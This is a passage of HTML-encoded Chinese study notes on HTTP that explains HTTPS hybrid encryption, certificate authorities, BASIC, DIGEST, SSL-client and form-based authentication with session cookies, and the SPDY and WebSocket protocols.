&#x4F7F;&#x7528;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;&#xFF0C;&#x53D1;&#x9001;&#x5BC6;&#x6587;&#x7684;&#x4E00;&#x65B9;&#x4F7F;&#x7528;&#x5BF9;&#x65B9;&#x7684;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#xFF0C;&#x5BF9;&#x65B9;&#x6536;&#x5230;&#x88AB;&#x52A0;&#x5BC6;&#x7684;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x518D;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x79C1;&#x6709;&#x5BC6;&#x94A5;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#x3002;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x53D1;&#x9001;&#x7528;&#x6765;&#x89E3;&#x5BC6;&#x7684;&#x79C1;&#x6709;&#x5BC6;&#x94A5;&#xFF0C;&#x4E5F;&#x4E0D;&#x5FC5;&#x62C5;&#x5FC3;&#x5BC6;&#x94A5;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x7A83;&#x542C;&#x800C;&#x76D7;&#x8D70;&#x3002;</p>
<p>HTTPS&#x91C7;&#x7528;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x548C;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x4E24;&#x8005;&#x5E76;&#x7528;&#x7684;&#x6DF7;&#x5408;&#x52A0;&#x5BC6;&#x673A;&#x5236;&#x3002;&#x82E5;&#x5BC6;&#x94A5;&#x80FD;&#x591F;&#x5B9E;&#x73B0;&#x5B89;&#x5168;&#x4EA4;&#x6362;&#xFF0C;&#x90A3;&#x4E48;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x8003;&#x8651;&#x4EC5;&#x4F7F;&#x7528;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x6765;&#x901A;&#x4FE1;&#x3002;&#x4F46;&#x662F;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x4E0E;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x76F8;&#x6BD4;&#xFF0C;&#x5176;&#x5904;&#x7406;&#x901F;&#x5EA6;&#x8981;&#x6162;&#x3002;&#x5173;&#x4E8E; SSL &#x7684;&#x8BC1;&#x660E;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x6B63;&#x786E;&#x6027;&#x7684;&#x8BC1;&#x4E66;&#x6765;&#x6E90;&#xFF0C;&#x6570;&#x5B57;&#x8BC1;&#x4E66;&#x8BA4;&#x8BC1;&#x673A;&#x6784;&#x5904;&#x4E8E;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x53CC;&#x65B9;&#x90FD;&#x53EF;&#x4FE1;&#x8D56;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x673A;&#x6784;&#x7684;&#x7ACB;&#x573A;&#x4E0A;&#x3002;&#x6570;&#x5B57;&#x8BC1;&#x4E66;&#x8BA4;&#x8BC1;&#x673A;&#x6784;&#x5728;&#x5224;&#x660E;&#x63D0;&#x51FA;&#x7533;&#x8BF7;&#x8005;&#x7684;&#x8EAB;&#x4EFD;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x5BF9;&#x5DF2;&#x7533;&#x8BF7;&#x7684;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x505A;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#xFF0C;&#x7136;&#x540E;&#x5206;&#x914D;&#x8FD9;&#x4E2A;&#x5DF2;&#x7B7E;&#x540D;&#x7684;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#xFF0C;&#x5E76;&#x5C06;&#x8BE5;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x653E;&#x5165;&#x516C;&#x94A5;&#x8BC1;&#x4E66;&#x540E;&#x7ED1;&#x5B9A;&#x5728;&#x4E00;&#x8D77;&#x3002;</p>
<h2 id="%E7%A1%AE%E8%AE%A4%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E7%9A%84%E8%AE%A4%E8%AF%81">&#x786E;&#x8BA4;&#x8BBF;&#x95EE;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x7684;&#x8BA4;&#x8BC1;</h2>
<p>&#x67D0;&#x4E9B;&#x9875;&#x9762;&#x53EA;&#x60F3;&#x8BA9;&#x7279;&#x5B9A;&#x7684;&#x4EBA;&#x6D4F;&#x89C8;&#xFF0C;&#x4E3A;&#x8FBE;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x6807;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x7684;&#x5C31;&#x662F;&#x8BA4;&#x8BC1;&#x529F;&#x80FD;&#x3002;</p>
<h3 id="basic%E8%AE%A4%E8%AF%81">BASIC&#x8BA4;&#x8BC1;</h3>
<p>BASIC&#x8BA4;&#x8BC1;&#xFF08;&#x57FA;&#x672C;&#x8BA4;&#x8BC1;&#xFF09;&#x662F;&#x4ECE;HTTP/1.0&#x5C31;&#x5B9A;&#x4E49;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x5373;&#x4FBF;&#x662F;&#x73B0;&#x5728;&#x4ECD;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x7F51;&#x7AD9;&#x4F1A;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x662F;Web&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x901A;&#x4FE1;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;</p>
<p>&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x9700;&#x8981;BASIC&#x8BA4;&#x8BC1;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x968F;&#x72B6;&#x6001;&#x7801;401 Authorization Required&#xFF0C;&#x8FD4;&#x56DE;&#x5E26;WWW-Authenticate&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x7684;&#x54CD;&#x5E94;&#x3002;&#x8BE5;&#x5B57;&#x6BB5;&#x5185;&#x5305;&#x542B;&#x8BA4;&#x8BC1;&#x7684;&#x65B9;&#x5F0F;&#xFF08;BASIC&#xFF09;&#x53CA;Request-URI&#x5B89;&#x5168;&#x57DF;&#x5B57;&#x7B26;&#x4E32;&#xFF08;realm&#xFF09;&#x3002;&#x63A5;&#x6536;&#x5230;&#x72B6;&#x6001;&#x7801;401&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x4E3A;&#x4E86;&#x901A;&#x8FC7;BASIC&#x8BA4;&#x8BC1;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x7528;&#x6237;ID&#x53CA;&#x5BC6;&#x7801;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x3002;&#x53D1;&#x9001;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x662F;&#x7531;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x6784;&#x6210;&#xFF0C;&#x4E24;&#x8005;&#x4E2D;&#x95F4;&#x4EE5;&#x5192;&#x53F7;&#xFF08;:&#xFF09;&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x518D;&#x7ECF;&#x8FC7;Base64&#x7F16;&#x7801;&#x5904;&#x7406;&#x3002;&#x63A5;&#x6536;&#x5230;&#x5305;&#x542B;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Authorization&#x8BF7;&#x6C42;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F1A;&#x5BF9;&#x8BA4;&#x8BC1;&#x4FE1;&#x606F;&#x7684;&#x6B63;&#x786E;&#x6027;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#x3002;&#x5982;&#x9A8C;&#x8BC1;&#x901A;&#x8FC7;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x4E00;&#x6761;&#x5305;&#x542B;Request-URI&#x8D44;&#x6E90;&#x7684;&#x54CD;&#x5E94;&#x3002;</p>
<p>BASIC&#x8BA4;&#x8BC1;&#x867D;&#x7136;&#x91C7;&#x7528;Base64&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x8FD9;&#x4E0D;&#x662F;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#x3002;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x9644;&#x52A0;&#x4FE1;&#x606F;&#x5373;&#x53EF;&#x5BF9;&#x5176;&#x89E3;&#x7801;&#x3002;&#x6362;&#x8A00;&#x4E4B;&#xFF0C;&#x7531;&#x4E8E;&#x660E;&#x6587;&#x89E3;&#x7801;&#x540E;&#x5C31;&#x662F;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5728;HTTP&#x7B49;&#x975E;&#x52A0;&#x5BC6;&#x901A;&#x4FE1;&#x7684;&#x7EBF;&#x8DEF;&#x4E0A;&#x8FDB;&#x884C;BASIC&#x8BA4;&#x8BC1;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x4EBA;&#x7A83;&#x542C;&#xFF0C;&#x88AB;&#x76D7;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x6781;&#x9AD8;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#x60F3;&#x518D;&#x8FDB;&#x884C;&#x4E00;&#x6B21;BASIC&#x8BA4;&#x8BC1;&#x65F6;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5374;&#x65E0;&#x6CD5;&#x5B9E;&#x73B0;&#x8BA4;&#x8BC1;&#x6CE8;&#x9500;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x95EE;&#x9898;&#x4E4B;&#x4E00;&#x3002;BASIC&#x8BA4;&#x8BC1;&#x4F7F;&#x7528;&#x4E0A;&#x4E0D;&#x591F;&#x4FBF;&#x6377;&#x7075;&#x6D3B;&#xFF0C;&#x4E14;&#x8FBE;&#x4E0D;&#x5230;&#x591A;&#x6570;Web&#x7F51;&#x7AD9;&#x671F;&#x671B;&#x7684;&#x5B89;&#x5168;&#x6027;&#x7B49;&#x7EA7;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x5E76;&#x4E0D;&#x5E38;&#x7528;&#x3002;</p>
<h3 id="digest%E8%AE%A4%E8%AF%81">DIGEST&#x8BA4;&#x8BC1;</h3>
<p>&#x4E3A;&#x5F25;&#x8865;BASIC&#x8BA4;&#x8BC1;&#x5B58;&#x5728;&#x7684;&#x5F31;&#x70B9;&#xFF0C;&#x4ECE;HTTP/1.1&#x8D77;&#x5C31;&#x6709;&#x4E86;DIGEST&#x8BA4;&#x8BC1;&#x3002;DIGEST&#x8BA4;&#x8BC1;&#x540C;&#x6837;&#x4F7F;&#x7528;&#x8D28;&#x8BE2;/&#x54CD;&#x5E94;&#x7684;&#x65B9;&#x5F0F;&#xFF08;challenge/response&#xFF09;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x50CF;BASIC&#x8BA4;&#x8BC1;&#x90A3;&#x6837;&#x76F4;&#x63A5;&#x53D1;&#x9001;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x3002;&#x6240;&#x8C13;&#x8D28;&#x8BE2;&#x54CD;&#x5E94;&#x65B9;&#x5F0F;&#x662F;&#x6307;&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x4E00;&#x65B9;&#x4F1A;&#x5148;&#x53D1;&#x9001;&#x8BA4;&#x8BC1;&#x8981;&#x6C42;&#x7ED9;&#x53E6;&#x4E00;&#x65B9;&#xFF0C;&#x63A5;&#x7740;&#x4F7F;&#x7528;&#x4ECE;&#x53E6;&#x4E00;&#x65B9;&#x90A3;&#x63A5;&#x6536;&#x5230;&#x7684;&#x8D28;&#x8BE2;&#x7801;&#x8BA1;&#x7B97;&#x751F;&#x6210;&#x54CD;&#x5E94;&#x7801;&#x3002;&#x6700;&#x540E;&#x5C06;&#x54CD;&#x5E94;&#x7801;&#x8FD4;&#x56DE;&#x7ED9;&#x5BF9;&#x65B9;&#x8FDB;&#x884C;&#x8BA4;&#x8BC1;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p>
<h3 id="ssl%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81">SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;</h3>
<p>&#x4ECE;&#x4F7F;&#x7528;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x65B9;&#x9762;&#x6765;&#x8BB2;&#xFF0C;&#x53EA;&#x8981;&#x4E8C;&#x8005;&#x7684;&#x5185;&#x5BB9;&#x6B63;&#x786E;&#xFF0C;&#x5373;&#x53EF;&#x8BA4;&#x8BC1;&#x662F;&#x672C;&#x4EBA;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x4F46;&#x5982;&#x679C;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x88AB;&#x76D7;&#xFF0C;&#x5C31;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x88AB;&#x7B2C;&#x4E09;&#x8005;&#x5192;&#x5145;&#x3002;&#x5229;&#x7528;SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x5219;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x8BE5;&#x60C5;&#x51B5;&#x7684;&#x53D1;&#x751F;&#x3002;</p>
<p>SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x662F;&#x501F;&#x7531;HTTPS&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8BC1;&#x4E66;&#x5B8C;&#x6210;&#x8BA4;&#x8BC1;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x51ED;&#x501F;&#x5BA2;&#x6237;&#x7AEF;&#x8BC1;&#x4E66;&#x8BA4;&#x8BC1;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x786E;&#x8BA4;&#x8BBF;&#x95EE;&#x662F;&#x5426;&#x6765;&#x81EA;&#x5DF2;&#x767B;&#x5F55;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x4E3A;&#x8FBE;&#x5230;SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x4E8B;&#x5148;&#x5C06;&#x5BA2;&#x6237;&#x7AEF;&#x8BC1;&#x4E66;&#x5206;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4E14;&#x5BA2;&#x6237;&#x7AEF;&#x5FC5;&#x987B;&#x5B89;&#x88C5;&#x6B64;&#x8BC1;&#x4E66;&#x3002;</p>
<p>&#x5728;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x4E0D;&#x4F1A;&#x4EC5;&#x4F9D;&#x9760;&#x8BC1;&#x4E66;&#x5B8C;&#x6210;&#x8BA4;&#x8BC1;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x548C;&#x57FA;&#x4E8E;&#x8868;&#x5355;&#x8BA4;&#x8BC1;&#xFF08;&#x7A0D;&#x540E;&#x8BB2;&#x89E3;&#xFF09;&#x7EC4;&#x5408;&#x5F62;&#x6210;&#x4E00;&#x79CD;&#x53CC;&#x56E0;&#x7D20;&#x8BA4;&#x8BC1;&#xFF08;Two-factor authentication&#xFF09;&#x6765;&#x4F7F;&#x7528;&#x3002;</p>
<h3 id="%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81">&#x57FA;&#x4E8E;&#x8868;&#x5355;&#x8BA4;&#x8BC1;</h3>
<p>&#x57FA;&#x4E8E;&#x8868;&#x5355;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x6CD5;&#x5E76;&#x4E0D;&#x662F;&#x5728;HTTP&#x534F;&#x8BAE;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x5411;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;Web&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53D1;&#x9001;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#xFF08;Credential&#xFF09;&#xFF0C;&#x6309;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x7684;&#x9A8C;&#x8BC1;&#x7ED3;&#x679C;&#x8BA4;&#x8BC1;&#x3002;</p>
<p>&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x5DF2;&#x4E8B;&#x5148;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;ID&#xFF08;&#x901A;&#x5E38;&#x662F;&#x4EFB;&#x610F;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#xFF09;&#x548C;&#x5BC6;&#x7801;&#x7B49;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;Web&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x57FA;&#x4E8E;&#x8BA4;&#x8BC1;&#x7ED3;&#x679C;&#x6765;&#x51B3;&#x5B9A;&#x8BA4;&#x8BC1;&#x662F;&#x5426;&#x6210;&#x529F;&#x3002;</p>
<p>&#x5BA2;&#x6237;&#x7AEF;&#x628A;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x7B49;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x653E;&#x5165;&#x62A5;&#x6587;&#x7684;&#x5B9E;&#x4F53;&#x90E8;&#x5206;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x4EE5;POST&#x65B9;&#x6CD5;&#x628A;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x3002;&#x800C;&#x8FD9;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;HTTPS&#x901A;&#x4FE1;&#x6765;&#x8FDB;&#x884C;HTML&#x8868;&#x5355;&#x753B;&#x9762;&#x7684;&#x663E;&#x793A;&#x548C;&#x7528;&#x6237;&#x8F93;&#x5165;&#x6570;&#x636E;&#x7684;&#x53D1;&#x9001;&#x3002;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x53D1;&#x653E;&#x7528;&#x4EE5;&#x8BC6;&#x522B;&#x7528;&#x6237;&#x7684;Session ID&#x3002;&#x901A;&#x8FC7;&#x9A8C;&#x8BC1;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x8BA4;&#x8BC1;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7528;&#x6237;&#x7684;&#x8BA4;&#x8BC1;&#x72B6;&#x6001;&#x4E0E;Session ID&#x7ED1;&#x5B9A;&#x540E;&#x8BB0;&#x5F55;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Set-Cookie&#x5185;&#x5199;&#x5165;Session ID&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x4E3A;&#x51CF;&#x8F7B;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;&#xFF08;XSS&#xFF09;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;&#xFF0C;&#x5EFA;&#x8BAE;&#x4E8B;&#x5148;&#x5728;Cookie&#x5185;&#x52A0;&#x4E0A;httponly&#x5C5E;&#x6027;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x6765;&#x7684;Session ID&#x540E;&#xFF0C;&#x4F1A;&#x5C06;&#x5176;&#x4F5C;&#x4E3A;Cookie&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x3002;&#x4E0B;&#x6B21;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x81EA;&#x52A8;&#x53D1;&#x9001;Cookie&#xFF0C;&#x6240;&#x4EE5;Session ID&#x4E5F;&#x968F;&#x4E4B;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53EF;&#x901A;&#x8FC7;&#x9A8C;&#x8BC1;&#x63A5;&#x6536;&#x5230;&#x7684;Session ID&#x8BC6;&#x522B;&#x7528;&#x6237;&#x548C;&#x5176;&#x8BA4;&#x8BC1;&#x72B6;&#x6001;&#x3002;</p>
<h2 id="%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE">&#x57FA;&#x4E8E;HTTP&#x7684;&#x529F;&#x80FD;&#x8FFD;&#x52A0;&#x534F;&#x8BAE;</h2>
<p>&#x5728;&#x5EFA;&#x7ACB;HTTP&#x6807;&#x51C6;&#x89C4;&#x8303;&#x65F6;&#xFF0C;&#x5236;&#x8BA2;&#x8005;&#x4E3B;&#x8981;&#x60F3;&#x628A;HTTP&#x5F53;&#x4F5C;&#x4F20;&#x8F93;HTML&#x6587;&#x6863;&#x7684;&#x534F;&#x8BAE;&#x3002;HTTP&#x529F;&#x80FD;&#x4E0A;&#x7684;&#x4E0D;&#x8DB3;&#x53EF;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x4E00;&#x5957;&#x5168;&#x65B0;&#x7684;&#x534F;&#x8BAE;&#x6765;&#x5F25;&#x8865;&#x3002;&#x53EF;&#x662F;&#x76EE;&#x524D;&#x57FA;&#x4E8E;HTTP&#x7684;Web&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4F7F;&#x7528;&#x73AF;&#x5883;&#x5DF2;&#x904D;&#x5E03;&#x5168;&#x7403;&#xFF0C;&#x56E0;&#x6B64;&#x65E0;&#x6CD5;&#x5B8C;&#x5168;&#x629B;&#x5F03;HTTP&#x3002;&#x6709;&#x4E00;&#x4E9B;&#x65B0;&#x534F;&#x8BAE;&#x7684;&#x89C4;&#x5219;&#x662F;&#x57FA;&#x4E8E;HTTP&#x7684;&#xFF0C;&#x5E76;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#x6DFB;&#x52A0;&#x4E86;&#x65B0;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
<h3 id="%E6%B6%88%E9%99%A4http%E7%93%B6%E9%A2%88%E7%9A%84spdy">&#x6D88;&#x9664;HTTP&#x74F6;&#x9888;&#x7684;SPDY</h3>
<p>&#x5F53;&#x51E0;&#x767E;&#x3001;&#x51E0;&#x5343;&#x4E07;&#x7684;&#x7528;&#x6237;&#x53D1;&#x5E03;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;Web&#x7F51;&#x7AD9;&#x4E3A;&#x4E86;&#x4FDD;&#x5B58;&#x8FD9;&#x4E9B;&#x65B0;&#x589E;&#x5185;&#x5BB9;&#xFF0C;&#x5728;&#x5F88;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x5C31;&#x4F1A;&#x53D1;&#x751F;&#x5927;&#x91CF;&#x7684;&#x5185;&#x5BB9;&#x66F4;&#x65B0;&#x3002;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x5B9E;&#x65F6;&#x5730;&#x663E;&#x793A;&#x8FD9;&#x4E9B;&#x66F4;&#x65B0;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4E00;&#x6709;&#x5185;&#x5BB9;&#x66F4;&#x65B0;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x76F4;&#x63A5;&#x628A;&#x90A3;&#x4E9B;&#x5185;&#x5BB9;&#x53CD;&#x9988;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x754C;&#x9762;&#x4E0A;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x9700;&#x8981;Ajax&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x3002;Ajax&#xFF08;Asynchronous JavaScript and XML&#xFF0C;&#x5F02;&#x6B65;JavaScript&#x4E0E;XML&#x6280;&#x672F;&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x6709;&#x6548;&#x5229;&#x7528;JavaScript&#x548C;DOM&#xFF08;Document Object Model&#xFF0C;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x6A21;&#x578B;&#xFF09;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x5C40;&#x90E8;Web&#x9875;&#x9762;&#x66FF;&#x6362;&#x52A0;&#x8F7D;&#x7684;&#x5F02;&#x6B65;&#x901A;&#x4FE1;&#x624B;&#x6BB5;&#x3002;&#x548C;&#x4EE5;&#x524D;&#x7684;&#x540C;&#x6B65;&#x901A;&#x4FE1;&#x76F8;&#x6BD4;&#xFF0C;&#x7531;&#x4E8E;&#x53EA;&#x66F4;&#x65B0;&#x4E00;&#x90E8;&#x5206;&#x9875;&#x9762;&#xFF0C;&#x54CD;&#x5E94;&#x4E2D;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4F1A;&#x56E0;&#x6B64;&#x800C;&#x51CF;&#x5C11;&#xFF0C;&#x8FD9;&#x4E00;&#x4F18;&#x70B9;&#x663E;&#x800C;&#x6613;&#x89C1;&#x3002;&#x5904;&#x4E8E;&#x6301;&#x7EED;&#x5F00;&#x53D1;&#x72B6;&#x6001;&#x4E2D;&#x7684;SPDY&#x534F;&#x8BAE;&#xFF0C;&#x6B63;&#x662F;&#x4E3A;&#x4E86;&#x5728;&#x534F;&#x8BAE;&#x7EA7;&#x522B;&#x6D88;&#x9664;HTTP&#x6240;&#x906D;&#x9047;&#x7684;&#x74F6;&#x9888;&#x3002;SPDY&#x4EE5;&#x4F1A;&#x8BDD;&#x5C42;&#x7684;&#x5F62;&#x5F0F;&#x52A0;&#x5165;&#xFF0C;&#x63A7;&#x5236;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x6D41;&#x52A8;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x91C7;&#x7528;HTTP&#x5EFA;&#x7ACB;&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#x3002;</p>
<h3 id="%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%8F%8C%E5%B7%A5%E9%80%9A%E4%BF%A1%E7%9A%84websocket">&#x4F7F;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8FDB;&#x884C;&#x5168;&#x53CC;&#x5DE5;&#x901A;&#x4FE1;&#x7684;WebSocket</h3>
<p>&#x5229;&#x7528;Ajax&#x548C;Comet&#x6280;&#x672F;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x53EF;&#x4EE5;&#x63D0;&#x5347;Web&#x7684;&#x6D4F;&#x89C8;&#x901F;&#x5EA6;&#x3002;&#x4F46;&#x95EE;&#x9898;&#x5728;&#x4E8E;&#x901A;&#x4FE1;&#x82E5;&#x4F7F;&#x7528;HTTP&#x534F;&#x8BAE;&#xFF0C;&#x5C31;&#x65E0;&#x6CD5;&#x5F7B;&#x5E95;&#x89E3;&#x51B3;&#x74F6;&#x9888;&#x95EE;&#x9898;&#x3002;</p>
